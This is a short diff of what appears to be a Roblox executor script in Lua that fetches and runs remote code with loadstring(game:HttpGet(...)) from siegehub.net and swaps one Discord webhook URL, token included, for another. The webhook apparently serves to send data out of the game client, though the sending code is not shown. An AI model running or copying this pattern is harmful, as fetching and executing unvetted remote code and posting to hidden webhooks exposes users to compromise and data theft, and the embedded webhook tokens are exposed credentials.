@@ -2,7 +2,7 @@ local Atlas = loadstring(game:HttpGet("https://siegehub.net/Atlas.lua"))()
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local Webhook_URL = "https://discord.com/api/webhooks/1127363876284010617/TKgM2IjzjXOvaOKQXnjnd5POGZdO_DYr68TSvo3DDpFGhWF7-Y3x1EkudMmvqIhAXtgB"
+local Webhook_URL = "https://discord.com/api/webhooks/1127692474022899803/hlWgAz5WMmynqqiyBB1K32-DQSNG8Z4j-LGH8LpF3wGoo_IxmbQOnw6q27w8eYRa-0Ph"
 local response
 
 if request and type(request) == "function" then
